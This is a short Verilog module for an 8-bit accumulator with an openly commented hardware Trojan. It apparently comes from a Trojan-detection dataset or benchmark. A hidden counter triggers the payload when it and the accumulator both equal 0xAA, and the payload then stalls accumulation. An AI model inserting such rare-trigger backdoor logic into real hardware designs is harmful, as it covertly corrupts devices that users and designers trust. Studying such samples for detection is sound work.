module accum8(input clk, input rst_n, input en, input [7:0] din,
               output reg [7:0] acc);

  // Trojan: sequential counter tracks number of accumulations
  reg [7:0] seq_cnt;

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      acc     <= 8'b0;
      seq_cnt <= 8'b0;
    end else if (en) begin
      seq_cnt <= seq_cnt + 8'b1;
      // Trojan trigger: seq_cnt == 8'hAA AND acc == 8'hAA
      if (seq_cnt == 8'hAA && acc == 8'hAA)
        acc <= acc; // payload: stall accumulation (degrade performance)
      else
        acc <= acc + din;
    end
  end

endmodule